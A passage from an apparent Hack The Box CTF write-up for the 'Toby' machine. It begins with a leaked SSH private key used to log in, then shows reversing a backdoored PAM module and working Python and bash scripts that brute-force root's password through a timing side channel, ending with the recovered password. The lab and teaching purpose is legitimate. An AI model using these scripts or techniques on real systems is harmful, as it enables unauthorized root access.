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
0jZ2DP0AFwApsAAAAIcm9vdEBsYWIBAgM=
-----END OPENSSH PRIVATE KEY-----
``` 

Save it and change it's permission and you can get ssh on toby.htb with this key as jack.

![Screenshot from 2022-04-19 21-54-55](https://user-images.githubusercontent.com/79413473/164050701-9887d8c4-981d-49af-8fa6-262da4b08c50.png)

## Privilege Escaltion: Reversing pam.so file and brute force root's password

One thing we haven't paid attention to yet that there is a db file on gogs.

![Screenshot from 2022-04-19 22-02-05](https://user-images.githubusercontent.com/79413473/164051892-922a4f59-a9eb-478e-ab2f-ad2152e7afcb.png)

let's download this and `file` commands shows it is a sqlite database. Let's open it 

There are two tables one of them contains encrypted blob and other has key to decrypt it.

![2022-04-19_22-06](https://user-images.githubusercontent.com/79413473/164052721-5aaebabb-608e-4fcb-b8e6-d4b3c91955be.png)

Each support blob has their respective key|IV in encryption table respectively. In cyberchef 

```
8dadda77134736074501b69eef9eb21ffdb5d4827565ab9ce50587349325ca27de85c94f318293df5c15d5177ecdcf4876f90b57cce5cd81a61275ac24971fe9
```
is **This support system sucks, we need to change it!**.
```
740e66f585adae9d02d4003116ffb9082779744ab1c21c420c4dd2c1aa53f265db23958e2a6af21bed36d160844d7c99ce3ae0921b94476567148269c2ee93857e4f2798feb1118e9d17974ade1310a70ed6707acd3ccd92c211f30f86cc2febbf9ad2178b243a3cd4923529770f81dc76a923f39de902b08dfe8c97af64e2132e01b1e0ec62532604e2f932e6189c27a41cd833ee54536e515588d58deb4fa7ebddb9d6a827624aee18601b40f23c6002b40a2c99e417f8f26bb55783e38768
``` 
is **Hi, my authentication has been really slow since we were attacked. I ran some scanners as my user but didn't find anything out of the ordinary. Can an engineer please come and look?**

Third one doesn't decrypt. Now this can be hint towards what to look for next.

Well on contrast of what it says in support message, authentication is actually faster on toby than my machine. Looks like theye fixed it.

![Screenshot from 2022-04-19 22-17-15](https://user-images.githubusercontent.com/79413473/164054583-736866ec-a9ec-449a-9f17-76bc241e5b4d.png)


Now reading about what [pam](https://www.redhat.com/sysadmin/pluggable-authentication-modules-pam) is, how pam helps different application in providing authentication feature. And [incorrect password delay](https://biancatamayo.me/blog/why-do-incorrect-sudo-passwords-take-so-long/) is a feature to protect against bruteforce attacks. Now comparing files in **/etc/pam.d** with my files. I see delay has been removed from file like *login* and *common-auth* on toby.

![Screenshot from 2022-04-19 22-48-48](https://user-images.githubusercontent.com/79413473/164178916-a2db201a-495f-4503-9ca7-c7fcaff7561f.png)

![Screenshot from 2022-04-19 22-48-17](https://user-images.githubusercontent.com/79413473/164178973-0455cbfa-2631-4e19-88a7-5203ac29379e.png)

The nodelay removes the default 2-second delay and all files using this file will have nodealy set.

In linux using `--time-style=f` flag we can get detailed timestamps of file. 

`ls -la --time-style=f` shows when each file was modified with seconds precision 

![Screenshot from 2022-04-19 22-54-46](https://user-images.githubusercontent.com/79413473/164060735-9b2d2981-670c-458d-a7cc-5adad630978b.png)

On my machine timestamps of *su* and *login* file was 00000000 seconds like others while on toby it is modified.

Now looking at date on which they were modified i.e **2021-07-14**, we will search for all files modified on 14th of july using find command 

```
find / -type f -newermt 2021-07-14 ! -newermt 2021-07-15 2>/dev/null | grep -v "python3\|.gz"
```

grep -v is filtering out common stuffs for better results. 

Now one of the file stands out from all the results. i.e. */usr/lib/x86_64-linux-gnu/security/mypam.so* This is not a default file and also only this one has executable set and has a big memory size too. Defenitely worthy of looking at. Also */etc/.bd* was intreseting.

![Screenshot from 2022-04-19 23-09-15](https://user-images.githubusercontent.com/79413473/164063137-c77f7967-a285-4d99-98c8-44627f745409.png)

### Reversing mypam.so in ghidra

Let's transfer this file to our machine and open in ghidra.
Searching for this /etc/.bd highlights a function **pam_sm_authenticate**

![2022-04-19_23-31](https://user-images.githubusercontent.com/79413473/164067106-ced7753c-5d5e-4c16-9ec3-d0a5cc0c8ccf.png)


i renamed some variables to according to my understanding. 

+ When program starts, it checks if user has a blank password set by **_unix_blankpasswd** call, and if not then it promts for password by **pam_get_authtok**

![2022-04-20_00-13](https://user-images.githubusercontent.com/79413473/164073860-83e72623-3a9d-4ffa-b589-035f690c9d17.png)

+ Then it enters a do while, where every time it reads content of */etc/.bd* file which is hardcoded password.

![2022-04-20_00-16](https://user-images.githubusercontent.com/79413473/164074236-35cc98eb-043a-4104-ace9-6f82b78e1b5b.png)

+ Then it compares entered password first character with coded password, as value of i is 0 in starting. If it fails then it calls **_unix_verify_password**.  Which verifies password in linux and will probably give authentication error.

![2022-04-20_00-22](https://user-images.githubusercontent.com/79413473/164075182-cacc471b-efdf-4ebb-9294-b038744161ca.png)

but if it suceeded then it goes down further in loop do some processing and sleep for 0.1 seconds. Which means if our character matches then there will be a delay of 0.1 second.

![2022-04-20_00-24](https://user-images.githubusercontent.com/79413473/164075499-1a8f16ed-fcc5-4c02-b9c2-b335a1748576.png)

Now this loops for 10 times, which is length of password, also */etc/.bd* is 10 byte long.

![Screenshot from 2022-04-20 00-25-06](https://user-images.githubusercontent.com/79413473/164075664-1993eb19-169c-4df3-a19d-c3bae56a6076.png)


### writing script to brute force password 

We can brute force one character at a time, let's first create a list of all possible characters. I used one from **verify_passwd_hash** function in ghidra 
```
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./
``` 
with a quick python script i can break them in a line separated wordlist .
```
words="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./"

for i in words:
    with open('wl.txt','a+') as f:
        f.write(i+"\n")

print("done")
```
Then i tried to write a python script to detect the time delay which worked with a bash script and calculated which character caused the time delay and and put that in password and then brute force next character.

```
import subprocess
password=""
words="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./"
for j in range(0,10):
    for i in range(0,len(words)):
        pas=password+words[i]
        npas=password+words[i+1]
        print(pas)
        prev=subprocess.run(["bash","br.sh",pas],capture_output=True)
        nest=subprocess.run(["bash","br.sh",npas],capture_output=True)

        prev=float(prev.stderr.decode().strip())
        nest=float(nest.stderr.decode().strip())

        if (abs(nest-prev) >= 0.1) and (nest>prev):
            password+=words[i+1]
            print(password)
            break
        elif (abs(nest-prev) >= 0.1) and (prev<nest):
            password+=words[i]
            break
```

But this script fails in multiple cases as time delay is sometime not 0.1 seconds. And sometime prev character is password and different things which i tried to handlw but failed. It was also slow and basically sucked. Gonna try to understand how 0xdf did it.

I finally used a bash script to bruteforce the character one by one and on detection i manually terminated the script and appended that chaaracter to password and bruteforce next character.

**brute.sh**
```
#!/bin/bash

TIMEFORMAT=%E
for i in $(cat wl.txt); do
	pass=$1$i
	printf "%-11s" $pass
    	time printf "%-10s" $pass | su root 2>/dev/null
done
```

Run the script first time without any argument then note that character T is delayed. Run script second time with argument `T`, then you will note delay on character `i`. Run script again with argument `Ti`. Now repeat this process 10 times. You will get root's password **TihPAQ4pse**.

![Screenshot from 2022-04-20 14-25-21](https://user-images.githubusercontent.com/79413473/164193329-5ead70e6-a2bf-46be-bb95-d0de6cfca006.png)

![Screenshot from 2022-04-20 14-30-45](https://user-images.githubusercontent.com/79413473/164193343-96f8d830-89d2-4b80-a638-762f4ca29eb1.png)

![Screenshot from 2022-04-20 14-34-10](https://user-images.githubusercontent.com/79413473/164193367-1f267eba-5d63-4269-abd9-bebda66a77ed.png)

Now `su root`  and enter the password. and that's how we get root on this machine

![Screenshot from 2022-04-20 14-39-20](https://user-images.githubusercontent.com/79413473/164193704-792590d7-99e8-4ddc-a3b5-0752ec5dfd72.png)

Thank you for reading and feedbacks are welcome.

Twitter: [Avinashkroy](https://twitter.com/Avinashkroy)





